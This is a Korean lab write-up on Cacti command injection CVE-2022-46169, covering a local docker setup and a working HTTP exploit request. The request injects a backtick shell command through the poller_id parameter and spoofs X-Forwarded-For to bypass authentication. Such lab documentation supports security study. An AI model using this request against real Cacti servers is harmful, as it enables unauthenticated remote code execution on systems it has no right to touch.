

# Cacti Unauthenticated Command Injection (CVE-2022-46169)
**Contributor**

[이종건(rmvhrdl)](https://github.com/rmvhrdl)
## 취약점 개요
Cacti는 전 세계 사용자들을 위한 강력하고 확장 가능한 운영 모니터링 및 장애 관리 프레임워크입니다.
Command Injection취약점이 1.2.17부터 1.2.22버전의 Cacti에서 발생하였습니다.
모니터링되는 장치에 대해 특정 데이터 소스가 선택된 경우, 인증되지 않은 사용자가 임의 코드를 실행할 수 있었습니다.

## 취약한 환경 구성

다음과 같은 명령어를 통해 취약한 환경을 구성합니다.
```
docker compose up -d
```
서버가 시작되면, `http://localhost:8080`으로 접속하여 로그인을 할 수 있습니다.

이후 id admin/ pw admin을 입력하고 완료 페이지가 나올 때 까지 next버튼을 눌러주면 됩니다.

<img width="816" alt="1" src="https://github.com/rmvhrdl/WhiteHatSchool_1st/assets/138293077/a17eb659-06ea-44fa-b4c8-14b5d421737c">

exploit전에, 디폴트 그래프 타입에서는 취약점이 발생하지 않기 때문에 새로운 그래프를 추가해 줍니다.
타입은 Device-Uptime으로 설정한뒤 생성합니다.

<img width="1274" alt="2" src="https://github.com/rmvhrdl/WhiteHatSchool_1st/assets/138293077/d186f60d-a5df-4737-bd11-03c6bbbcc93e">


이제 취약한 환경 구성은 끝났습니다. Exploit으로 넘어가겠습니다.

## Exploit

위의 환경 구성이 끝났다면, 이제 다음과 같은 요청문을 Cacti서버에 보내어 Command Injection공격을 실행시킬 수 있습니다.

```
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success` HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: localhost.lan
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<img width="703" alt="3" src="https://github.com/rmvhrdl/WhiteHatSchool_1st/assets/138293077/8e81f05b-6aa8-4783-a5b2-6cdae6e52e18">

코드상의 `touch/tmp/success`가 실행된 것을 확인 할 수 있었습니다.

<img width="703" alt="4" src="https://github.com/rmvhrdl/WhiteHatSchool_1st/assets/138293077/4d5c8107-c4ac-4691-8154-cb455fbad00b">

또 다른 예시를 보여드리겠습니다.

<img width="703" alt="5" src="https://github.com/rmvhrdl/WhiteHatSchool_1st/assets/138293077/ab26c1a2-e0be-4608-9ea4-69419ad3517e">

코드상의 `touch/tmp/success2`가 실행된 것을 확인 할 수 있었습니다.

<img width="703" alt="6" src="https://github.com/rmvhrdl/WhiteHatSchool_1st/assets/138293077/c546d08f-f393-4de4-a4d9-1077593152e0">










